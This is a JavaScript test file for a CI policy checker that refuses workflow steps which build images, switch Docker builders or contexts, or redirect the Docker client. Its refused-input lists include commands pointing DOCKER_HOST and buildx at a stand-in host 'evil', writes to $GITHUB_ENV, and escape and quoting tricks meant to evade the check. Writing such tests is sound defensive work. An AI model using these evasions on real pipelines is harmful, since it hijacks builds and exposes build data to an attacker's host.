// Run steps of jobs that are not pinned (#488): the run-command parser, env and step shells.
// A cheap extra check; the jobs that build, publish or test an image are pinned whole.
import assert from "node:assert/strict";
import { test } from "node:test";
import { loadWorkflow } from "./lib.mjs";
import { buildChecks, runBuildViolations, shellCommands, stepOf, withStep } from "./policy.mjs";

const REFUSED_ENV = [
  ["workflow env DOCKER_HOST", d => { d.env = { DOCKER_HOST: "tcp://evil:2375" }; }],
  ["job env BUILDX_BUILDER", d => { d.jobs.web.env = { BUILDX_BUILDER: "evil" }; }],
  ["step env DOCKER_CONTEXT", d => { stepOf(d.jobs.web, "actions/checkout").env = { DOCKER_CONTEXT: "evil" }; }],
  ["step env BUILDKIT_PROGRESS", d => { stepOf(d.jobs.web, "actions/checkout").env = { BUILDKIT_PROGRESS: "plain" }; }],
  ["job env DOCKER_BUILDKIT", d => { d.jobs.web.env = { DOCKER_BUILDKIT: "0" }; }],
  ["job env DOCKER_CONFIG", d => { d.jobs.web.env = { DOCKER_CONFIG: "/tmp/evil" }; }],
  ["step env COMPOSE_FILE", d => { d.jobs.web.steps.push({ env: { COMPOSE_FILE: "/tmp/evil.yml" }, run: "python3 scripts/staging.py up" }); }],
  ["DOCKER_HOST written to GITHUB_ENV", d => { d.jobs.web.steps.push({ run: 'echo "DOCKER_HOST=tcp://evil:2375" >> "$GITHUB_ENV"' }); }],
  ["DOCKER_HOST written in pieces to GITHUB_ENV", d => { d.jobs.web.steps.push({ run: 'echo "DOCKER_""HOST=tcp://evil:2375" >> "$GITHUB_ENV"' }); }],
  ["BUILDX_CONFIG exported", d => { d.jobs.web.steps.push({ run: "export BUILDX_CONFIG=/tmp/evil" }); }],
  ["DOCKER_CONFIG exported", d => { d.jobs.web.steps.push({ run: 'export DOCKER_CONFIG="$RUNNER_TEMP/x"' }); }],
];
for (const [label, mutate] of REFUSED_ENV) {
  test(`env that changes the Docker client is refused: ${label}`, () => {
    const data = structuredClone(loadWorkflow("ci"));
    mutate(data);
    assert.match(buildChecks("ci", data).join(), /selects a builder or changes the Docker client/);
  });
}

const REFUSED_SHELLS = [
  { shell: "python", run: "import subprocess; subprocess.run(['docker', 'build', '.'])" },
  { shell: "docker build -t x . && bash {0}", run: "true" },
  { shell: "pwsh", run: "docker build ." },
];
for (const step of REFUSED_SHELLS) {
  test(`a step shell other than bash or sh is refused: ${step.shell}`, () => assert.match(buildChecks("ci", withStep("ci", "web", step)).join(), /shell .* is not bash or sh/));
}

test("a job default shell other than bash or sh is refused", () => {
  const data = withStep("ci", "web", { run: "true" });
  data.jobs.web.defaults = { run: { shell: "python {0}" } };
  assert.match(buildChecks("ci", data).join(), /shell .* is not bash or sh/);
});

test("the bash and sh step shells are accepted", () => {
  for (const shell of ["bash", "sh"]) assert.deepEqual(buildChecks("ci", withStep("ci", "web", { shell, run: "true" })), [], shell);
});

test("the shell reader splits commands and removes quotes", () => {
  const words = script => shellCommands(script).map(ws => ws.map(w => w.text).join(" "));
  assert.deepEqual(words('a "b c" d; e && f | g'), ["a b c d", "e", "f", "g"]);
  assert.deepEqual(words('echo "DOCKER_""HOST=x" >> "$GITHUB_ENV"'), ["echo DOCKER_HOST=x"]);
  assert.deepEqual(words("x=$(docker build -q .)\n# docker build .\ny"), ["docker build -q .", "x=", "y"]);
  assert.deepEqual(words("a \\\n  b"), ["a b"]);
});

// ---- the run-command parser (#488) ----

const CHECKED = new Set(["compose.yaml", "deploy/staging/compose.yaml", "deploy/staging/compose.openai.yaml"]);
const runCheck = script => runBuildViolations("ci.yml: job 'web'", script, CHECKED);

const RUN_LINES_THAT_PASS = [
  'docker exec gateway sh -c "exit 0"',
  "docker compose -f deploy/staging/compose.yaml logs -f gateway",
  "jq -c . report.json",
  'curl -H "Accept: application/json" https://example.org',
  "docker run --rm -h gateway open-model-gateway:staging --version",
  'docker buildx imagetools create --tag "${tag}" b',
  "docker cp gateway:/app/build ./out",
  "docker run --rm mirror.gcr.io/library/rust cargo build",
  "docker buildx version",
  "docker buildx imagetools inspect --raw x",
  "docker compose -p omg -f deploy/staging/compose.yaml --profile ops up -d",
  "docker --log-level warn ps",
  "cargo build --locked",
  "npm run build:web",
  "python3 scripts/staging.py up",
];
const RUN_LINES_THAT_ARE_REFUSED = [
  "docker build .",
  "sudo docker build .",
  "FOO=1 docker build .",
  "docker image build .",
  "docker builder build .",
  "docker buildx build .",
  "docker buildx b .",
  "docker buildx bake",
  "docker buildx --builder evil build .",
  "docker buildx create --use --driver remote tcp://evil:1234",
  "docker buildx use evil",
  "docker context create evil --docker host=tcp://evil:2375",
  "docker context use evil",
  "docker context update default --docker host=tcp://evil:2375",
  "docker context import evil evil.tar",
  "docker -c evil ps",
  "docker -cevil ps",
  "docker --context evil ps",
  "docker --context=evil ps",
  "docker -H tcp://evil:2375 ps",
  "docker -Htcp://evil:2375 ps",
  "docker --host=tcp://evil:2375 ps",
  "docker --config /tmp/evil ps",
  "docker --config=/tmp/evil ps",
  "docker --unknown-global ps",
  "docker compose build",
  "docker compose up --build -d",
  "docker compose run --build gateway",
  "docker compose create --build",
  "docker compose -fevil.yml up -d",
  "docker compose -f evil.yml up -d",
  "docker compose --file=evil.yml up -d",
  'docker compose --file "$F" up -d',
  "docker compose -f - up -d",
  "docker compose --env-file evil.env up -d",
  "docker compose --env-file=evil.env up -d",
  "docker compose --project-directory /tmp up -d",
  "docker-compose -f evil.yaml up",
  "podman build .",
  "nerdctl build .",
  "buildah bud .",
  "buildah build .",
  "buildctl build --frontend dockerfile.v0",
  "kaniko --context .",
  "python3 scripts/staging.py build",
  "./scripts/staging.py build",
  "d=docker; $d build .",
  '"$d" build .',
  "${DOCKER} build .",
  "x=$(docker build -q .)",
  "x=`docker build -q .`",
  "echo FROM alpine | docker build -",
  "true && docker build .",
  "docker \\\n  build .",
];

test("the run-command parser accepts ordinary commands that only look like builds", () => {
  for (const line of RUN_LINES_THAT_PASS) assert.deepEqual(runCheck(line), [], line);
});

test("the run-command parser refuses builds, builder and endpoint switches and unchecked Compose files", () => {
  for (const line of RUN_LINES_THAT_ARE_REFUSED) assert.ok(runCheck(line).length > 0, line);
});

const ESCAPED_ENV = [
  "printf 'DOCKER_\\x48OST=tcp://evil:2375\\n' >> \"$GITHUB_ENV\"",
  "echo -e 'DOCKER_\\x48OST=tcp://evil:2375' >> \"$GITHUB_ENV\"",
  "printf 'DOCKER_\\110OST=tcp://evil:2375\\n' >> \"$GITHUB_ENV\"",
  "printf 'DOCKER_\\u0048OST=tcp://evil:2375\\n' >> \"$GITHUB_ENV\"",
];
for (const run of ESCAPED_ENV) {
  test(`an escaped Docker env name is refused: ${run.slice(0, 40)}`, () => {
    assert.match(buildChecks("ci", withStep("ci", "web", { run })).join(), /DOCKER_HOST selects a builder or changes the Docker client/);
  });
}
